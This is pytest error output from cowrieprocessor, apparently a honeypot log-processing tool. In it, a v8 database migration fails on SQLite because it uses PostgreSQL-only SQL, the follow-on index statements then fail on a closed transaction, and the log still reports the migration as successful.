INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for files.vt_malicious will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:418 Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
INFO     cowrieprocessor.db.migrations:migrations.py:683 Starting snowshoe detection schema migration (v8)
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
INFO     cowrieprocessor.db.migrations:migrations.py:725 Snowshoe detection schema migration (v8) completed successfully
_____ ERROR at setup of TestLongtailStorage.test_pgvector_detection_sqlite _____

    @pytest.fixture
    def temp_db():
        """Create a temporary SQLite database for testing."""
        with tempfile.NamedTemporaryFile(suffix=".db", delete=False) as f:
            db_path = f.name
    
        engine = create_engine(f"sqlite:///{db_path}")
>       apply_migrations(engine)

/home/speterson/cowrieprocessor/tests/integration/test_longtail_storage.py:37: 
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 
/home/speterson/cowrieprocessor/cowrieprocessor/db/migrations.py:182: in apply_migrations
    _set_schema_version(connection, 8)
/home/speterson/cowrieprocessor/cowrieprocessor/db/migrations.py:132: in _set_schema_version
    result = connection.execute(stmt)
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/base.py:1419: in execute
    return meth(
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/sql/elements.py:526: in _execute_on_connection
    return connection._execute_clauseelement(
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/base.py:1641: in _execute_clauseelement
    ret = self._execute_context(
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/base.py:1836: in _execute_context
    TransactionalContext._trans_ctx_check(self)
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 

cls = <class 'sqlalchemy.engine.util.TransactionalContext'>
subject = <sqlalchemy.engine.base.Connection object at 0x7756e92e7070>

    @classmethod
    def _trans_ctx_check(cls, subject: _TConsSubject) -> None:
        trans_context = subject._trans_context_manager
        if trans_context:
            if not trans_context._transaction_is_active():
>               raise exc.InvalidRequestError(
                    "Can't operate on closed transaction inside context "
                    "manager.  Please complete the context manager "
                    "before emitting further commands."
                )
E               sqlalchemy.exc.InvalidRequestError: Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.

/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/util.py:111: InvalidRequestError
---------------------------- Captured stdout setup -----------------------------
2025-10-18 17:40:01,313:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Set default source_generation values
2025-10-18 17:40:01,314:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Create unique index on raw_events
2025-10-18 17:40:01,321:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate session_id from JSON (SQLite)
2025-10-18 17:40:01,323:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_type from JSON (SQLite)
2025-10-18 17:40:01,326:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_timestamp from JSON (SQLite)
2025-10-18 17:40:01,328:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
2025-10-18 17:40:01,329:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
2025-10-18 17:40:01,332:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
2025-10-18 17:40:01,333:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
2025-10-18 17:40:01,334:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
2025-10-18 17:40:01,336:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for files.vt_malicious will be set on next schema creation
2025-10-18 17:40:01,339:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v7:Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
2025-10-18 17:40:01,340:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Starting snowshoe detection schema migration (v8)
2025-10-18 17:40:01,341:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
2025-10-18 17:40:01,342:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:40:01,345:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:40:01,345:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:40:01,346:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:40:01,346:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:40:01,346:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Snowshoe detection schema migration (v8) completed successfully
------------------------------ Captured log setup ------------------------------
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Set default source_generation values
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Create unique index on raw_events
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Populate session_id from JSON (SQLite)
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Populate event_type from JSON (SQLite)
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Populate event_timestamp from JSON (SQLite)
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for files.vt_malicious will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:418 Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
INFO     cowrieprocessor.db.migrations:migrations.py:683 Starting snowshoe detection schema migration (v8)
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
INFO     cowrieprocessor.db.migrations:migrations.py:725 Snowshoe detection schema migration (v8) completed successfully
_______ ERROR at setup of TestLongtailStorage.test_analysis_checkpoints ________

    @pytest.fixture
    def temp_db():
        """Create a temporary SQLite database for testing."""
        with tempfile.NamedTemporaryFile(suffix=".db", delete=False) as f:
            db_path = f.name
    
        engine = create_engine(f"sqlite:///{db_path}")
>       apply_migrations(engine)

/home/speterson/cowrieprocessor/tests/integration/test_longtail_storage.py:37: 
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 
/home/speterson/cowrieprocessor/cowrieprocessor/db/migrations.py:182: in apply_migrations
    _set_schema_version(connection, 8)
/home/speterson/cowrieprocessor/cowrieprocessor/db/migrations.py:132: in _set_schema_version
    result = connection.execute(stmt)
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/base.py:1419: in execute
    return meth(
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/sql/elements.py:526: in _execute_on_connection
    return connection._execute_clauseelement(
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/base.py:1641: in _execute_clauseelement
    ret = self._execute_context(
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/base.py:1836: in _execute_context
    TransactionalContext._trans_ctx_check(self)
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 

cls = <class 'sqlalchemy.engine.util.TransactionalContext'>
subject = <sqlalchemy.engine.base.Connection object at 0x7756b26f8210>

    @classmethod
    def _trans_ctx_check(cls, subject: _TConsSubject) -> None:
        trans_context = subject._trans_context_manager
        if trans_context:
            if not trans_context._transaction_is_active():
>               raise exc.InvalidRequestError(
                    "Can't operate on closed transaction inside context "
                    "manager.  Please complete the context manager "
                    "before emitting further commands."
                )
E               sqlalchemy.exc.InvalidRequestError: Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.

/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/util.py:111: InvalidRequestError
---------------------------- Captured stdout setup -----------------------------
2025-10-18 17:40:04,294:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Set default source_generation values
2025-10-18 17:40:04,295:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Create unique index on raw_events
2025-10-18 17:40:04,302:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate session_id from JSON (SQLite)
2025-10-18 17:40:04,303:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_type from JSON (SQLite)
2025-10-18 17:40:04,304:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_timestamp from JSON (SQLite)
2025-10-18 17:40:04,306:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
2025-10-18 17:40:04,307:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
2025-10-18 17:40:04,308:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
2025-10-18 17:40:04,309:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
2025-10-18 17:40:04,310:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
2025-10-18 17:40:04,312:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for files.vt_malicious will be set on next schema creation
2025-10-18 17:40:04,313:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v7:Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
2025-10-18 17:40:04,314:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Starting snowshoe detection schema migration (v8)
2025-10-18 17:40:04,314:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
2025-10-18 17:40:04,315:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:40:04,316:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:40:04,316:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:40:04,317:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:40:04,317:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:40:04,317:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Snowshoe detection schema migration (v8) completed successfully
------------------------------ Captured log setup ------------------------------
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Set default source_generation values
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Create unique index on raw_events
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Populate session_id from JSON (SQLite)
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Populate event_type from JSON (SQLite)
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Populate event_timestamp from JSON (SQLite)
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for files.vt_malicious will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:418 Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
INFO     cowrieprocessor.db.migrations:migrations.py:683 Starting snowshoe detection schema migration (v8)
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
INFO     cowrieprocessor.db.migrations:migrations.py:725 Snowshoe detection schema migration (v8) completed successfully
____ ERROR at setup of TestLongtailStorage.test_storage_with_empty_results _____

    @pytest.fixture
    def temp_db():
        """Create a temporary SQLite database for testing."""
        with tempfile.NamedTemporaryFile(suffix=".db", delete=False) as f:
            db_path = f.name
    
        engine = create_engine(f"sqlite:///{db_path}")
>       apply_migrations(engine)

/home/speterson/cowrieprocessor/tests/integration/test_longtail_storage.py:37: 
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 
/home/speterson/cowrieprocessor/cowrieprocessor/db/migrations.py:182: in apply_migrations
    _set_schema_version(connection, 8)
/home/speterson/cowrieprocessor/cowrieprocessor/db/migrations.py:132: in _set_schema_version
    result = connection.execute(stmt)
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/base.py:1419: in execute
    return meth(
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/sql/elements.py:526: in _execute_on_connection
    return connection._execute_clauseelement(
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/base.py:1641: in _execute_clauseelement
    ret = self._execute_context(
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/base.py:1836: in _execute_context
    TransactionalContext._trans_ctx_check(self)
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 

cls = <class 'sqlalchemy.engine.util.TransactionalContext'>
subject = <sqlalchemy.engine.base.Connection object at 0x7756e9399390>

    @classmethod
    def _trans_ctx_check(cls, subject: _TConsSubject) -> None:
        trans_context = subject._trans_context_manager
        if trans_context:
            if not trans_context._transaction_is_active():
>               raise exc.InvalidRequestError(
                    "Can't operate on closed transaction inside context "
                    "manager.  Please complete the context manager "
                    "before emitting further commands."
                )
E               sqlalchemy.exc.InvalidRequestError: Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.

/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/util.py:111: InvalidRequestError
---------------------------- Captured stdout setup -----------------------------
2025-10-18 17:40:07,476:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Set default source_generation values
2025-10-18 17:40:07,477:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Create unique index on raw_events
2025-10-18 17:40:07,485:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate session_id from JSON (SQLite)
2025-10-18 17:40:07,486:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_type from JSON (SQLite)
2025-10-18 17:40:07,487:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_timestamp from JSON (SQLite)
2025-10-18 17:40:07,489:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
2025-10-18 17:40:07,491:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
2025-10-18 17:40:07,492:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
2025-10-18 17:40:07,493:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
2025-10-18 17:40:07,495:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
2025-10-18 17:40:07,497:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for files.vt_malicious will be set on next schema creation
2025-10-18 17:40:07,498:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v7:Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
2025-10-18 17:40:07,499:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Starting snowshoe detection schema migration (v8)
2025-10-18 17:40:07,500:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
2025-10-18 17:40:07,501:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:40:07,503:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:40:07,504:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:40:07,504:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:40:07,505:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:40:07,505:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Snowshoe detection schema migration (v8) completed successfully
------------------------------ Captured log setup ------------------------------
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Set default source_generation values
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Create unique index on raw_events
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Populate session_id from JSON (SQLite)
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Populate event_type from JSON (SQLite)
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Populate event_timestamp from JSON (SQLite)
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
